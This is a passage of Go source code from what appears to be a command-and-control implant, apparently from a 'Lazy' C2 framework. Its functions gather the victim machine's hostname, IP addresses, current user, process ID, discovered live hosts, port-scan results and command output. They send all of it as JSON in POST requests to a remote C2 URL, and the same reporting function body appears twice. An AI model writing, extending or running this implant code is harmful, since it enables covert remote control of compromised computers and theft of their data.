    jsonData, _ := json.Marshal(map[string]interface{}{
        "output":          output,
        "client":          runtime.GOOS,
        "command":         command,
        "pid":             strconv.Itoa(pid),
        "hostname":        hostname,
        "ips":             strings.Join(ips, ", "),
        "user":            currentUser.Username,
        "discovered_ips":  discoveredLiveHosts,
        "result_portscan": resultadosEscaneo,
        "result_pwd": result_pwd,
    })
    var prettyJSON bytes.Buffer
    json.Indent(&prettyJSON, jsonData, "", "  ") 
    if lazyconf.DebugImplant == "True" {
        fmt.Println("JSON Data (Formatted):")
        fmt.Println(prettyJSON.String())
    }
    retryRequest(ctx, C2_URL+MALEABLE+CLIENT_ID, "POST", string(jsonData), "")
}

func handleResponse(ctx context.Context, command string, shellMsg string, lazyconf LazyDataType, resultadosEscaneo map[string][]int) {
    defer globalRecover()
    output := shellMsg
    pid := os.Getpid()
    hostname, _ := os.Hostname()
    ips := getIPs()
    
    currentUser, _ := user.Current()

    jsonData, _ := json.Marshal(map[string]interface{}{
        "output":          output,
        "client":          runtime.GOOS,
        "command":         command,
        "pid":             strconv.Itoa(pid),
        "hostname":        hostname,
        "ips":             strings.Join(ips, ", "),
        "user":            currentUser.Username,
        "discovered_ips":  discoveredLiveHosts,
        "result_portscan": resultadosEscaneo,
        "result_pwd": result_pwd,
    })
    var prettyJSON bytes.Buffer
    json.Indent(&prettyJSON, jsonData, "", "  ") 
    if lazyconf.DebugImplant == "True" {
        fmt.Println("JSON Data (Formatted):")
        fmt.Println(prettyJSON.String())
    }
    retryRequest(ctx, C2_URL+MALEABLE+CLIENT_ID, "POST", string(jsonData), "")
}

func getIPs() []string {
    var ips []string
    addrs, _ := net.InterfaceAddrs()
    for _, addr := range addrs {
        if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
            ips = append(ips, ipnet.IP.String())
        }
    }
    if GlobalIP == "" {
        if !getipFailed {
		    GlobalIP = GetGlobalIP()
        }
        ips = append(ips, GlobalIP)
    }
    return ips
}